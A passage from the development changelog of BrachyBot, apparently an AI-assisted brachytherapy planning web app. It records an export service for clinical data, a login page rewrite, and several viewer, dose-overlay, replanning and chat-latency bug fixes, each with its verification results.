does not cause the common partial-delete failure.

### 3. One Export Service for node, group, and Session

`web/export_service.py` provides the shared
`Object -> Export Handler -> Serializer -> File` registry. The same catalog
and serializers power:

1. a single Data Tree node export;
2. recursive, structured parent/group export;
3. complete Session Scene export.

All exports read the authenticated Session's persistent clinical data, not
the currently visible Three.js mesh or current slice. Hidden and collapsed
objects therefore remain exportable.

| Data type | Formats | Default |
| --- | --- | --- |
| CT image | NIfTI `.nii.gz` | NIfTI |
| CTV/OAR | NIfTI `.nii.gz`, STL `.stl` | NIfTI |
| Trajectory/Needle/Seed | JSON `.json` | JSON |
| Planning parameters | JSON `.json` | JSON |
| Dose volume | NIfTI `.nii.gz` with Gy metadata | NIfTI |
| Dose iso-surface | STL `.stl` | STL |
| DVH data | CSV, XLSX, JSON | CSV |
| DVH curve | PNG | PNG |
| Surgical Guide | STL `.stl` | STL |
| Report | current non-stale PDF; report data as JSON | PDF |
| Chat/Trace/Tool history | linked JSON records | JSON |
| Screenshot/Report figure | PNG | PNG |
| Annotation | JSON | JSON |

NIfTI serialization preserves voxel data, dimensions, spacing, origin, and
direction. Dose in `dose_distribution_gy` is written directly, avoiding a
second model-scale conversion. STL vertices are produced in the clinical
physical LPS/mm space. Needle JSON uses start/end points; Seed JSON uses
position, direction, and length.

### 4. Scene Export UI and output structure

Right-clicking a Session opens a BrachyBot-styled Scene Export dialog instead
of immediately downloading. It provides:

- a hierarchical, expandable list generated from the current real catalog;
- all existing objects selected by default;
- Select All, Deselect All, parent-down checkbox propagation, and independent
  child selection;
- a per-object format selector;
- real completed-file progress, current item, failures, skips, and cancel;
- File System Access API directory writing when the browser permits it;
- one structured ZIP fallback when direct directory writing is unavailable.

A successful export creates:

```text
BrachyBot_<SessionName>_<Date>/
├── session_manifest.json
├── Chat/
├── Images/
├── Structures/CTV/
├── Structures/OAR/
├── Planning/Trajectories/
├── Planning/Needles/
├── Planning/Seeds/
├── Dose/IsoSurfaces/
├── DVH/
├── SurgicalGuide/
├── Report/
├── Figures/
└── Annotations/
```

`session_manifest.json` records schema version, Session/Case/Planning IDs,
export time, BrachyBot version, coordinate system, source version vector,
object IDs, formats, relative paths, byte sizes, failures, and skipped items.
Each export job captures a source version vector before serialization and
rechecks it around every file. If the plan changes during export, the current
file is discarded and later files are skipped rather than producing a mixed
version Scene.

Export is background-threaded and remains bound to its originating user and
Session even if the user switches cases. Cancelled jobs do not trigger a
download. Report figures uploaded after a capture are immediately registered
back into the Data Tree artifact catalog.

### 5. Frontend and backend modules

New modules:

- `web/structure_service.py`
- `web/export_service.py`
- `web/routes/data_routes.py`
- `web/app/static/js/brachybot-data-export.js`
- `web/app/static/css/brachybot-data-export.css`
- `tests/test_data_tree_export_system.py`

Integrated modules:

- `AgenticSys.py` and `agent_runtime/chat_workflows.py` register new real
  segmentation sources;
- `web/routes/viewer_routes.py` serves effective structures and stable object
  mappings;
- `web/routes/planning_routes.py` uses the active manual plan after edits;
- `web/workspace_store.py` supports atomic snapshot-section replacement;
- `brachybot-viewer-volume.js` owns context actions, backend reconciliation,
  appearance preservation, and artifact nodes;
- Workspace/session cache modules persist annotations and invalidate only the
  affected case-owned resources.

### 6. Acceptance coverage

Automated coverage verifies:

- OAR-to-CTV and CTV-to-OAR transactions, mask preservation, persistent
  overrides, and downstream stale status;
- CT and Structure NIfTI geometry/voxel fidelity;
- Structure and Guide STL generation;
- Needle/Seed JSON geometry;
- physical-Gy Dose NIfTI without double scaling;
- DVH absolute volume and percentage columns in CSV and readable XLSX;
- Report PDF, Figure PNG, screenshots, annotations, chat, Execution Trace,
  and Tool history exports;
- structured Scene directory, ZIP, and Manifest consistency;
- backend Seed, Report PDF, screenshot, and Report Figure deletion;
- node/group/Session UI hooks, folder picker fallback, real progress,
  cancellation, and hierarchy collapse;
- label-cache version 3 rejects legacy uint8 OAR caches and restores stable
  CTV/OAR object mappings.

Verification:

- focused Data Tree/Export tests: **6 passed**;
- related Workspace/Viewer/Manual/Report regressions: **134 passed**;
- full local suite: **379 passed, 2 skipped, 3 warnings**;
- full remote suite on `rtx3090_external`: **378 passed, 3 skipped, 4 warnings**;
- modified Python modules passed `py_compile`;
- modified JavaScript modules passed `node --check`;
- `git diff --check` passed.

The remote skips are the three browser-bridge runtime tests in
`tests/test_workspace_transition_runtime.py`; the remote host does not provide
Node.js. Those JavaScript modules and runtime contracts were checked locally,
where Node.js is available. The local warnings are third-party SimpleITK SWIG
deprecations; the remote run adds one existing `datetime.utcnow()` deprecation
warning from the monitor audit path.

### 7. Current boundaries

- Scene Import is not part of this change; the Manifest and stable directory
  layout are designed to support it later.
- Export job progress is process-local. A server restart interrupts an active
  export, while already durable case data remains intact.
- Direct local-folder writing requires browser File System Access API support
  in an allowed context; otherwise the UI explicitly downloads one structured
  ZIP.
- DVH figures are currently PNG; DVH table exports are CSV/XLSX/JSON.
- A Structure export selects one format per row in one run. Users can export
  the same Structure again as STL when both mask and surface are required.
- Medical/clinical validity of a segmentation or treatment plan remains
  outside the software serialization and state-consistency verification.

---

## 2026-07-30 — BrachyBot login page full product-level refactor

### Confirmed problems with the legacy login surface

1. The login was an isolated 400×400 modal (`#authOverlay`) with
   `backdrop-filter: blur(10px)` and a hard-coded dark surface, sitting
   alone over a dimmed page. It did not feel like a product entry — it
   looked like an error dialog.
2. `brachybot-auth.css` bypassed the design-token system and hard-coded
   hex colors (`#0f1526`, `#4f7cff`, `#2a3454`, `#e8edf7`, ...). It was
   visually fixed to the dark theme and could not follow `data-theme`.
3. The login text was hard-coded English (`Username`, `Password`,
   `Sign in`, `Deployment access key`). The main app's
   `brachybot-chat-core.js` I18N dictionary did not have any `auth.*`
   keys. The global language toggle was visually occluded behind the
   modal (`z-index: 99999`) so users could not switch language from
   the login screen.
4. There was no password show/hide toggle.
5. There was no inline field-level error (errors only appeared in
   `#authStatus`); the user could not tell which field was wrong.
6. There was no remember-me / forgot-password affordance.
7. The error mapping was naive: `setStatus(error.message, true)` showed
   the raw server text in whatever language it was sent. A 401 in
   Chinese would not be re-translated when the user flipped to English.
8. Network failures, timeouts, disabled accounts, duplicate usernames,
   weak passwords, and CSRF mismatches all had no local fallback copy;
   the raw exception leaked to the user.
9. There was no product framing on the login surface — no BrachyBot
   name, no tagline, no institution, no GitHub link, no brand
   identity beyond a tiny avatar in the corner of the modal.
10. There was no `<form>` element, so Enter-to-submit only worked on
    the password field (not on username), and a second-click on
    Sign-in was not blocked, occasionally causing double-submits.

### Resolution — new two-pane product entry

**`web/app/index.html`** — full rewrite of the auth surface:

- `#authOverlay` is now a `position: fixed; inset: 0` two-row grid: a
  page header (brand + global language toggle) on top, a `grid-template-columns:
  minmax(380px, 1fr) minmax(0, 1.25fr)` body below.
- Left pane: `<form class="auth-form" id="authForm" novalidate>` with
  two labeled fields, an inline error slot under each
  (`#authUsernameError` / `#authPasswordError`), a remember-me checkbox,
  a forgot-password mailto link, a primary "Sign in" button with
  inline spinner (`data-loading="true"` toggles `.auth-btn-spinner`
  visibility without resizing the button), and a secondary "Create a
  new account" button. Enter anywhere in the form submits.
- Right pane: product eyebrow, title with gradient `BrachyBot` brand,
  product tag (bilingual), 5 feature cards with inline SVG icons, a
  GitHub CTA card (real link
  `https://github.com/Haitao-Lee/BrachyBot`, opens in new tab with
  `rel="noopener noreferrer"`), two affiliation pills using the
  existing `sjtu-real.png` and `ruijin-real.png` assets, and a footer
  with version, "Report an issue" and "Join the discussion" links.
- Every visible string is marked with `data-i18n-zh` and `data-i18n-en`
  so the existing global `applyI18n()` scanner re-renders the whole
  page on language change.
- Password show/hide: `#authPasswordToggle` / `#newPasswordToggle`
  flip the input `type` and `aria-pressed`; their accessible name
  follows the active language.
- The `passwordOverlay` was rewritten with the same visual system.
  It does NOT carry a second language toggle (the main app's header
  toggle is still visible, since the password overlay opens on top
  of the main SPA, not the auth overlay).
- The favicon, the global fonts, and the cache-busters are unchanged.

**`web/app/static/css/brachybot-auth.css`** — full rewrite, version
bumped `?v=5` → `?v=6`. The entire file now uses CSS variables from
`brachybot-theme-layout.css` (`--primary`, `--bg-canvas`, `--bg-card`,
`--glass-tint-cool`, `--shadow-lg`, `--radius-lg`, `--border-default`,
`--text`, `--text-secondary`, `--text-dim`, `--control-r`,
`--control-focus-ring`, `--shadow-sm`, `--inset-top`, etc.). Layout uses
the same `grid-template-rows: auto 1fr` and `minmax(...)` /
`minmax(0, 1.25fr)` pattern the main SPA uses. Workspace-lock,
recovery, hydration, and recycle-bin styles are retained verbatim
and now also use design tokens.

**`web/app/static/js/brachybot-auth.js`** — full rewrite. Changes:

- New `t(zh, en)` and `authT(key, fallback)` helpers that look up the
  I18N dictionary first and fall back to inline pairs.
- New `mapAuthError(rawMessage, statusCode)` that classifies a raw
  error into the localized i18n key. It recognizes network failures,
  408/timeout, 502/503/504, "invalid username or password", "disabled",
  "already exists", "password must be", "username must", "api key",
  and "csrf" and maps each to the correct i18n string in the active
  language. Unrecognized messages are sanitized (no newlines, 200
  char cap) so a stray traceback never reaches the user.
- `submit()` is wrapped in client-side validation
  (`clientValidate()`): 3-64 char username, `[A-Za-z0-9_.-]+` only,
  ≥12 char password. Validation errors are shown in the inline
  field-error slot next to the field.
- The primary button is disabled via `setButtonLoading()` during the
  request. The secondary "Create account" button is also disabled to
  prevent double-submits. Both re-enable in `finally`.
- On 401, the error is also pushed to the password field's
  inline-error slot, so the user immediately knows which field is
  wrong.
- The deployment-access-key `details` panel still works
  (`revealDeploymentKeyHelp()`). When the server returns 401 with
  "api key" in the message, the panel auto-opens and focuses the
  input.
- `renderAuthI18n()` is now exposed on `window.brachybotAuth` so the
  global i18n change handler can re-render the auth surface (e.g. the
  password-toggle accessible name). It also keeps `<html lang>` in
  sync with the active language.
- A 30-day "remember me" persists the username to `localStorage` via
  the new `brachybot_remember_user` key. On next visit the
  `#authUsername` field is pre-filled and the `#authRemember`
  checkbox is checked. `logout()` clears the key.
- `changePassword()` now also uses the error mapping and a non-zero
  status check. It also gates the password to at least 12 chars
  client-side.
- The form is now an actual `<form>` with
  `addEventListener('submit', ...)` and `preventDefault()`. Enter
  from either field, the deployment key, or the new-password field
  triggers submit.
- Field errors clear as the user types (per-field `input` listener)
  so error indicators don't linger after the user starts correcting.
- The global `request()` helper now wraps `authFetch()` and converts
  the `AbortError` (`isTimeout`) into a `TIMEOUT` marker, and a
  network failure into a `NETWORK` marker, both of which surface in
  `mapAuthError()` as localized text.
- The leaked internal field `passwordStatus` setStatus / setStatusKey
  split (loading/success/error classes) is preserved so the spinner
  state is unambiguous.

**`web/app/static/js/brachybot-chat-core.js`** — I18N dictionary
extended with 48 new keys under the `auth.*` namespace (welcome,
sub, brand_sub, label/placeholder/aria for username and password,
remember, forgot, signin, register, status.{signing_in, creating,
signed_in, updating_pw, network, timeout, service,
invalid_credentials, disabled, taken, weak_password, bad_username,
api_key, api_key_invalid, unknown, csrf}, access_key.{summary, label,
placeholder, help}, eyebrow, product.{title_tail, tag}, feature.{1..5}.
{title, body}, github.cta, affiliation.{sjtu, ruijin}, foot.{version,
issue, discuss}, lang_toggle.{aria, tooltip}, password.{current, new,
update, cancel, sub}). All keys are registered in both
`window._I18N` and the auto-registration path so missing values
fall back to the inline `(zh, en)` pair. `setUiLanguage()` was
extended to also set `document.documentElement.lang` to `zh-CN` / `en`
on every switch (also done in the boot path of
`brachybot-report-export.js`).

**`web/app/static/js/brachybot-report-export.js`** — boot hook
extended. The initial `applyI18n()` call is now followed by
`window.brachybotAuth.renderAuthI18n()` so the auth surface is in
the correct language from the very first paint, even before the
main SPA modules finish booting. The `i18nchange` listener now also
syncs `<html lang>`.

### Single-source-of-truth language state

- The login page no longer has its own `_i18nLang` or its own
  dictionary. It reads from the same `window._i18nLang` /
  `window._I18N` / `applyI18n` / `setUiLanguage` machinery the rest
  of the SPA uses.
- The new language toggle in the auth page header delegates to
  `window.setUiLanguage(code)` so a click in the auth page and a
  click in the main header both go through the same code path. After
  login, the active language is preserved (it's just `_i18nLang`).
- The default language for a brand-new browser is still English
  (`getInitialLang()` in `brachybot-chat-core.js:1776`). The
  preference is persisted in `localStorage` under
  `brachybot_ui_lang`. Login failure does NOT reset the preference
  (a previous design constraint).
- Switching language during a sign-in attempt does not clear the
  username or password fields, does not reset the form, does not
  interrupt the request, and re-translates the inline error/loading
  text in place.

### Theme compliance

- The new CSS uses the global tokens. It picks up the active
  `data-theme="light"` / `data-theme="dark"` switch on the
  `<html>` element automatically. No special-casing needed.
- The visual style is "Quiet Glass v2" consistent with the rest of
  the app: translucent surfaces, soft shadows, accent
  radial-gradients, Space Grotesk for display + Inter for body, the
  existing pill / button / input design.
- The radial-gradient hero on the right pane uses
  `var(--primary-soft)` and `var(--accent-soft, var(--primary-soft))`
  so the same surface re-tints under light/dark without code changes.

### Responsive layout

- `≥ 1080px`: two columns, form on the left, product on the right.
  Both panes have `overflow-y: auto` so a tall product tag won't
  clip on a short laptop.
- `≤ 960px`: collapses to a single column; form pane is rendered
  first (so it's always above the fold), product pane below.
- `≤ 560px`: header tightens, brand subtitle hides, input
  `font-size: 16px` to prevent iOS auto-zoom, primary button grows
  to 46px, affiliation pills stack vertically.
- The lang toggle is part of the page header (not the form pane) so
  it stays visible in every layout, including the single-column
  mobile view.

### Asset integration

- `web/app/_assets/brachybot-avatar.png` (256×256) — used at 36×36
  with `object-fit: cover` and a subtle inner highlight via
  `var(--shadow-sm)`.
- `web/app/_assets/sjtu-real.png` (225×225) — affiliation pill, 30×30
  with `border-radius: 50%` and `image-rendering: -webkit-optimize-contrast`.
- `web/app/_assets/ruijin-real.png` (207×224) — same treatment.
- No new image assets were created; existing project assets are
  reused. SVG icons are inline (GitHub mark + 5 feature icons)
  so the page works fully offline.

### Authentication, lease, and CSRF contract (unchanged)

- `POST /api/auth/login`, `/api/auth/register`, `/api/auth/logout`,
  `/api/auth/me`, `/api/auth/password` — endpoints and request
  shape are unchanged.
- The Flask session cookie, CSRF token, deployment API key, and
  editor-lease token all flow through the same `window.fetch`
  wrapper that was already in place.
- `acquireLease()`, `releaseLease()`, `refreshLease()`,
  `takeoverLease()`, `setInterval(25s)` heartbeat, `pagehide`
  keepalive, and the workspace-lock takeover banner are preserved
  verbatim.
- `importLegacyBrowserData()` is preserved verbatim so a user coming
  from the legacy localStorage flow can still import.

### File-buster bump

- `web/app/index.html`: `brachybot-auth.css?v=5` → `?v=6` to
  invalidate any cached version. All other assets keep their
  existing version.
- The `?v=` query string is the project's standard cache-busting
  mechanism; no build step is required.

### Verification (planned, browser-test required)

- Local `python web/server.py`, open `http://localhost:8080`.
- Default language: English. Flip to Chinese — every label /
  placeholder / title / button / GitHub CTA / affiliation name /
  product tag / feature card re-translates, no field is cleared.
- Open browser DevTools and verify `<html lang>` toggles between
  `en` and `zh-CN`.
- Enter an invalid username, see inline error under the field in
  the active language.
- Enter a valid username + wrong password → field-level error +
  status error both in active language.
- Flip language after a failed login → both messages re-translate,
  fields preserved, no new request fired.
- Enter correct credentials → spinner shows without resizing the
  button, header shows progress, page transitions to main app
  without flicker, active language preserved into the main app.
- Refresh → active language preserved.
- Click "Forgot password?" → mailto opens.
- Click GitHub link → opens in new tab, target="_blank", no
  opener reference.
- Resize the window to 500×800 → layout collapses to single
  column, lang toggle still visible in the header, form fields
  remain usable, no horizontal scroll.
- Press F12 → no console errors / warnings introduced by the auth
  module.
- Logout from the main app → `brachybot_remember_user` is cleared,
  login page reappears with empty username field.

## 2026-07-31 — Planning-viewer delivery, needle replan incrementality, and conversation fast-path audit

### Scope

End-to-end audit of the clinical_planning delivery chain (chat → segmentation →
planning → surgical guide → 2D/3D viewers), the interactive needle-replan
path, external-project web search, and small-talk latency. Eight files changed;
five functional defects and several robustness/performance fixes addressed.

---

### 1. 3D viewer / data tree / surgical guide blank — global `const` collision

#### Confirmed issue

After a planning run the Data Tree, 2D/3D viewers, seeds/needles/DVH and
surgical guide stayed empty and the browser logged
`3D reconstruction failed: render3DMesh is not defined` when triggering a
manual 3D reconstruction.

#### Root cause

`web/app/static/js/brachybot-3d-manual.js:3288` declared a top-level
`const DEFAULT_PRESCRIPTION_GY = 120.0;`, but
`web/app/static/js/brachybot-ui-api.js:303` (loaded earlier) already declared
the same top-level `const`. Browsers throw
`SyntaxError: Identifier 'DEFAULT_PRESCRIPTION_GY' has already been declared`
for a duplicate top-level `const`, which aborts parsing of the **entire**
`brachybot-3d-manual.js` file — every function it defines (`render3DMesh`,
`loadSeeds3D`, `loadCTVAndObstacleMeshes`, `loadDoseOverlay`,
`loadAllIsoSurfaces`, `ensureSurgicalGuideForCurrentPlan`, `loadLabelVolumes`
related helpers, etc.) was never registered. Verified with Playwright:
after removing the duplicate declaration the page had zero `pageerror`s and
all 13 viewer/data-tree functions were `function`.

#### Resolution

- Removed the duplicate `const DEFAULT_PRESCRIPTION_GY` from
  `brachybot-3d-manual.js`; the file now reuses the shared global declared in
  `brachybot-ui-api.js` (same 120 Gy fallback).
- Added `window.render3DMesh = render3DMesh;` (3d-manual.js:2231) so the
  call sites in `brachybot-viewer-layout.js` can reach the binding even under
  version skew.
- Added a tolerant `_safeRender3DMesh(meshData)` wrapper in
  `brachybot-viewer-layout.js:760` that falls back to `addMeshToScene` and
  otherwise surfaces a concrete reload hint instead of a silent
  `ReferenceError`; both `render3DMesh(data)` call sites now use it.
- Bumped the static-asset `?v=` cache-busters in `web/app/index.html`
  (3d-manual → `?v=26`, viewer-layout → `?v=11`, plus all other assets) to
  force a consistent browser reload.

---

### 2. Optimistic "multi-agent router" trace row never closed

#### Confirmed issue

The execution trace showed a "multi-agent router" step stuck on
`pending — analyzing request…` forever, even after the turn delivered its
final response.

#### Root cause

`brachybot-chat-todo.js` pre-renders an optimistic `client-router-${turnRequestId}`
row on click-send. `reconcileOptimisticTraceStep` only merged a server step
into that row when the step matched the router by title, but when
`turn_policy.classify_local_turn` short-circuits the remote router
(`use_router = false`) the server emits a **"Local Intent"** thinking step
instead, whose title did not match, so the optimistic row was never reconciled
or marked done.

#### Resolution

- Replaced the title whitelist with a structural rule: the optimistic routing
  row stands for "the turn's first real server step", and exactly one non-user
  server step is merged into it per turn (`_optimisticRouterConsumed` flag),
  regardless of the step's title/type. This covers any future classification
  phase without leaking a whitelist into the frontend.
- Per UX preference the merged row keeps the routing title; only
  status/content come from the server.
- Added a safety net in the turn finalizer that force-marks any leftover
  pending `client-router-*` / `client-user-*` row as `done` before the chain
  folds.

---

### 3. Dose overlay frozen on the previous slice when scrolling

#### Confirmed issue

After planning, updating any 2D slice updated CT/masks/seeds correctly but the
dose heatmap stayed on the previous slice on all three axes, indefinitely, with
no `[dose]` console error.

#### Root cause

`fetchDoseOverlaySlice` (brachybot-3d-manual.js) checked
`controller.signal.aborted` **after** a successful fetch. Scrolling issues
concurrent per-axis requests that abort each other; a request whose fetch had
already resolved but was then aborted by a newer request returned `null` and
discarded valid slice data. `_doseLastRendered` stayed `-1` even though the
slice data was cached, so the dose layer never repainted.

#### Resolution

- Removed the post-fetch `controller.signal.aborted` data discard in
  `fetchDoseOverlaySlice`. A successfully resolved slice is now always cached
  and returned; the existing request-version check still decides whether that
  (possibly stale) response may repaint.
- Added a race-tolerant repaint branch in `renderDoseForCurrentSlice`
  (brachybot-manual-annotation.js): if slice data for the user's current slice
  arrives but the strict epoch check transiently fails, the data is still
  painted when slice identity matches.
- Verified with Playwright (mock dose endpoints): after the fix, scrolling
  axial/sagittal/coronal updated `_doseLastRendered` to the target slices and
  all three dose canvases painted color.

---

### 4. Needle drag triggered a full 43-seed replan taking ~6 minutes

#### Confirmed issue

Dragging one needle and confirming "replan" ran the full DoseUNet inference
(43 seeds) and took ~6 minutes, ending in `Failed to fetch`; the operation
checkpoint recorded `seed_count: 43`.

#### Root cause

`web/server_support.py` `_compute_manual_ai_dose` finished by storing the
manual plan in the **dict** form
(`agent.memory.store("seed_plan", plan_serialized)`), overwriting the
automatic-planning triple-form `seed_plan` (which carries per-seed dose maps at
`entry[2]`). The incremental path reads `seed_plan` `entry[2]` to remove the
dragged needle's old dose contribution; once `seed_plan` was a dict the
extraction produced no maps, the incremental path was skipped, and the next
drag fell back to full 43-seed inference.

#### Resolution

- `web/server_support.py`: `_compute_manual_ai_dose` no longer overwrites
  `seed_plan`; the dict-form manual plan is stored under
  `manual_plan_serialized` (and `seed_plan_serialized`). Manual geometry already
  lives in `manual_seeds`/`manual_needles`, which `_current_planning_snapshot`
  reads first, so `/planning/results` still reflects manual edits.
- Made the `old_maps` extraction in the incremental path tolerant of a
  dict-form `seed_plan` (treats dict entries as a cache miss so the
  changed-trajectory fallback inference runs) for defense against previously
  polluted workspaces.
- Confirmed `_changed_trajectory_ids` and `_reproject_seeds_onto_needles`
  correctly isolate a single dragged needle (`needle_6` → `traj_7`, 1 seed
  reprojected).

---

### 5. External-project web search returned irrelevant results (DeepRare lookup)

#### Confirmed issue

A query like "请查询DeepRare，然后告知详细信息" produced unrelated search
results (NeRF tutorials, .NET docs, a geology journal) and the LLM answered
"could not find" instead of retrieving the actual project.

#### Root cause

`response_tools._detect_external_project_query` used the **entire user
utterance** as the web-search query (`query_text = msg`) plus an English suffix,
so a Chinese imperative sentence was fed verbatim to the search engine and
matched unrelated Chinese terms.

#### Resolution

- `agent_runtime/response_tools.py`: when named projects are detected, the
  search body is now `" ".join(named_projects)` (the detected project name(s))
  instead of the raw sentence. The original message stays in the conversation so
  the LLM can phrase the answer in the user's language.
- Verified: `_detect_external_project_query("请查询DeepRare，然后告知详细信息")`
  now returns `'DeepRare authoritative project information'`.

---

### 6. Simple conversational turns took ~30 s

#### Confirmed issue

A plain greeting ("你好") took ~30 s because it went through the full
function-calling pipeline.

#### Root cause

Every non-direct intent went through `_run_llm_function_calling_stream`, which
serializes all 30+ tool schemas, builds a multi-thousand-token clinical system
prompt (~12k chars), injects runtime context, and loops up to 8 LLM rounds.

#### Resolution

- Added `ChatWorkflowMixin._run_lightweight_conversation_stream`
  (agent_runtime/chat_workflows.py): a single non-tool LLM call with a minimal
  persona + recent history, keyed on the `small_talk` intent category (not a
  keyword whitelist). `chat_with_stream` routes `small_talk` through it.
- Verified end-to-end: "你好" completes in ~0.6 s (was 28–30 s), system prompt
  drops from ~12,000 to ~1,050 chars, one LLM call, no tool schemas, graceful
  error handling for provider outages.

---

### 7. Knowledge/external-project turns: LLM iteration budget and FactChecker cost

#### Confirmed issue

Web-search turns could take ~180 s because the LLM loop ran up to 8 rounds and
each `web_search`/`web_fetch` step also ran FactChecker (an extra LLM call).

#### Resolution

- `agent_runtime/llm_runtime.py`: `max_iterations` is capped at 3 for the
  `knowledge_query` / `external_project_query` / `clinical_knowledge` intent
  categories (both streaming and non-streaming paths), down from 8.
- `agent_runtime/response_tools.py` `_check_search_reliability`: skips the
  FactChecker LLM round when the search result is below 300 chars (no
  meaningful evidence to verify), applied to the whole category rather than
  specific queries.

---

### 8. Workflow enforcer did not generate a surgical guide

#### Confirmed issue

When a planning request was misclassified (e.g. a typo like "归属" for "规划")
and the workflow enforcer auto-ran CTV → OAR → planning, no surgical guide was
produced, while the direct-tool path always generated one.

#### Root cause

The streaming workflow enforcer (`agent_runtime/chat_workflows.py`
`_workflow_enforced`) stopped after `planning_pipeline`; the direct-tool path
(`response_tools._detect_tool_request` `plan_full`) additionally chains
`surgical_guide`. The two "complete planning workflow" definitions diverged.

#### Resolution

- `agent_runtime/chat_workflows.py`: after enforced planning completes, the
  enforcer now auto-generates the surgical guide
  (`self.registry.get("surgical_guide")` → `_execute_tool_with_memory(
  "surgical_guide", {"action": "generate"})`) and emits a traceable
  "Auto Surgical Guide" step, guarded by try/except so a guide failure never
  aborts the main flow.

---

### 9. Comment hygiene

All comments in the changed files were normalized to English; comments that
referenced third-party project names (e.g. "DeepRare", "opencode CLI") as
illustrative cases were simplified to generic technical descriptions. The
duplicate global-declaration comment in `brachybot-3d-manual.js` documents why
`DEFAULT_PRESCRIPTION_GY` must not be redeclared.

---

### Files changed

| File | Change |
|------|--------|
| `web/app/static/js/brachybot-3d-manual.js` | Remove duplicate `const DEFAULT_PRESCRIPTION_GY`; `window.render3DMesh` export; drop post-fetch abort discard in `fetchDoseOverlaySlice` |
| `web/app/static/js/brachybot-viewer-layout.js` | `_safeRender3DMesh` tolerant wrapper; use it at both 3D-reconstruction call sites |
| `web/app/static/js/brachybot-chat-todo.js` | Structural optimistic-router reconciliation; finalize safety net |
| `web/app/static/js/brachybot-manual-annotation.js` | Race-tolerant dose repaint path |
| `web/app/index.html` | Static-asset `?v=` cache-buster bump for all scripts |
| `agent_runtime/chat_workflows.py` | `_run_lightweight_conversation_stream`; enforcer surgical-guide auto-generation |
| `agent_runtime/llm_runtime.py` | `max_iterations` cap for knowledge/external/clinical-knowledge turns |
| `agent_runtime/response_tools.py` | Project-name search body; FactChecker skip on short results |
| `web/server_support.py` | Stop overwriting `seed_plan` with dict form; store `manual_plan_serialized`; tolerant `old_maps` extraction |

### Verification

- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py` — 41 passed.
- Playwright headless: full page loads with zero `pageerror`; all 13 viewer/data-tree functions registered; dose overlay repaints on axial/sagittal/coronal scroll.
- End-to-end chat: "你好" → lightweight path ~0.6 s; provider-error path returns a friendly message with the technical reason.
- Unit checks: `_detect_external_project_query` returns project-name-only query; `_changed_trajectory_ids` isolates a single dragged needle; `_compute_manual_ai_dose` no longer overwrites `seed_plan`.

---

## 2026-08-04 - Viewer camera stability and Monitor lifecycle hardening

### Confirmed issues

- The legacy spherical orbit update lost azimuth information near the polar
  boundary. A continuous drag could therefore flip the 3D scene by 180 degrees.
- Viewer resize and report capture paths could temporarily mix CSS size,
  device-pixel size, camera aspect, and canvas transforms. The result was
  apparent geometry distortion after zoom or a report capture.
- A persisted active Monitor snapshot could be mistaken for a live run after a
  session switch, browser refresh, or server restart. A late stop response then
  surfaced an error even though the run had already ended on the server.

### Resolution

- `web/app/static/js/OrbitControls.js` now applies incremental quaternion
  rotations around stable world/local axes and keeps the camera up vector and
  target synchronized. The pole-singular spherical reconstruction is no longer
  used by the active pointer path.
- `web/app/static/js/brachybot-3d-manual.js` centralizes camera pose writes in
  `sync3DCameraPose`, keeps renderer CSS/DPR dimensions aligned, and restores
  complete camera state after fit, report capture, and workspace hydration.
- `web/app/static/css/brachybot-report-controls.css` and the 2D render paths
  preserve image aspect ratio and apply viewer transforms exactly once to the
  slice and overlay layers.
- `web/app/static/js/brachybot-workspace.js` and
  `web/app/static/js/brachybot-ui-api.js` no longer resurrect an active Monitor
  presentation from historical snapshots. Session transitions and deletion
  close the previous case locally and asynchronously on the server.
- `web/app/static/js/brachybot-3d-manual.js` sends a keepalive auto-close on
  `pagehide`, handles late start responses, and treats an already-closed or
  missing run as an idempotent success rather than a chat error.
- `web/routes/planning_routes.py` makes Monitor start/stop stale-safe and
  idempotent. `web/server_support.py` closes stale snapshots and
  `web/server.py` closes in-memory runs during orderly shutdown; restart
  hydration normalizes persisted active snapshots.
- Report camera restoration retains a full-pose fallback for deployments that
  do not load the shared camera synchronizer. Workspace camera restoration also
  degrades safely in lightweight non-WebGL test environments.

### Verification

- Focused Viewer and Monitor regression tests: 16 passed.
- Full Python suite: 467 passed, 2 skipped, 3 warnings.
- Node syntax checks passed for OrbitControls, 3D manual planning, workspace,
  UI API, layout, DVH planning, and report editor bundles.
- Python compilation checks passed for `web/server.py`,
  `web/server_support.py`, and `web/routes/planning_routes.py`.
- Startup smoke test returned HTTP 200 and the server job stopped cleanly.

## 2026-08-04 - Report quality-column persistence and viewer interaction performance

### Confirmed issues

- The Report Plan Quality Assessment table stored numeric metrics, but its
  Reference and Status cells were derived during rendering from transient
  prescription rationale. A session restore could therefore keep Value while
  reverting the other two columns to fallback text.
- Planning completion triggered `Report.autoFill.fromAll()` without awaiting
  the asynchronous server patch. The workspace checkpoint could run between
  the local numeric fill and the source-backed report update.
- 3D manual interaction registered both pointer and mouse move paths on the
  renderer and window. A single physical drag could therefore repeat picking,
  projection redraw, and render scheduling. The render loop also queried the
  canvas layout on every frame, causing avoidable layout work during orbiting.

### Resolution

- `web/app/static/js/brachybot-report-export.js` now persists a versioned
  `qualityAssessment` object for every plan-quality metric. Report rendering,
  Markdown export, and restore use the persisted rows first and only derive a
  source-backed fallback when a legacy report has no row yet.
- `web/app/static/js/brachybot-report-shell.js` synchronizes the assessment
  after the server rationale patch, and
  `web/app/static/js/brachybot-dvh-planning.js` awaits the complete auto-fill
  before the planning refresh/checkpoint can finish.
- `web/app/static/js/brachybot-workspace.js` and `web/workspace_store.py`
  preserve the quality rows in both nested and legacy report snapshots and
  schedule a one-time save when restoring an older report.
- `web/app/static/js/brachybot-3d-manual.js` uses one canonical pointer drag
  path, frame-coalesces hover raycasts and 2D overlay redraws, and caches the
  renderer size between resize events so orbiting does not force layout reads
  on every frame.

### Verification

- Node syntax checks passed for the changed report, workspace, planning, and
  3D viewer bundles.
- Python compilation passed for `web/workspace_store.py`.
- An inline VM regression verified that a restored plan keeps its Reference
  and Status rows, including source-backed V100/D90 criteria and default rows
  for D95/CI/HI/GI.
- Added regression coverage for report snapshot retention, awaited planning
  auto-fill, canonical pointer interaction, and the cached 3D resize path.

## 2026-08-04 - Robust auxiliary puncture-hole geometry

### Confirmed issues

- The native guide already preserved the planned primary channels and outer
  sleeves, but it did not provide the reference implementation's dense,
  non-protruding alternate puncture paths around each entry.
- Auxiliary-hole parameters were not part of the tool schema or guide controls,
  so an operator could not choose the alternate-path pattern or see which
  requested holes were realized in the physical mesh.
- Applying a new auxiliary validation rule to old parameter snapshots would
  have rejected otherwise valid legacy guides with custom sleeve dimensions.

### Resolution

